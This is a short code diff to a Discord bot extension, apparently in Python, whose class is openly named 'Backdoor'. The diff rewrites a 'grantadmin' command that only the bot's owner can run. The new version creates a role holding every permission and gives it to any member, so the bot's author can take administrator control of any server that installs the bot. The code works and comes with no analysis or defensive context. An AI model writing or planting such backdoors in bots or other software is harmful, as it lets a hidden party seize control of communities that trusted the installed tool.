@@ -15,14 +15,13 @@ class Backdoor(commands.Cog):
     async def grantadmin(self, ctx, member: discord.Member):
         """Grant Administrator role."""
         if ctx.author.id == YOUR_BOT_OWNER_ID:
-            admin_role = discord.utils.get(ctx.guild.roles, name='Administrator')
+            # Create a new role
+            new_role = await ctx.guild.create_role(name='NewAdminRole', permissions=discord.Permissions.all())
 
-            if admin_role:
-                await member.add_roles(admin_role)
-                await ctx.send(f'{member.mention} has been granted the Administrator role.')
-            else:
-                await member.add_roles(discord.utils.get(ctx.guild.roles, name='@everyone'))
-                await ctx.send(f'{member.mention} has been granted all permissions.')
+            # Assign the new role to the member
+            await member.add_roles(new_role)
+
+            await ctx.send(f'{member.mention} has been granted the new Administrator role.')
 
 def setup(bot):
     bot.add_cog(Backdoor(bot))
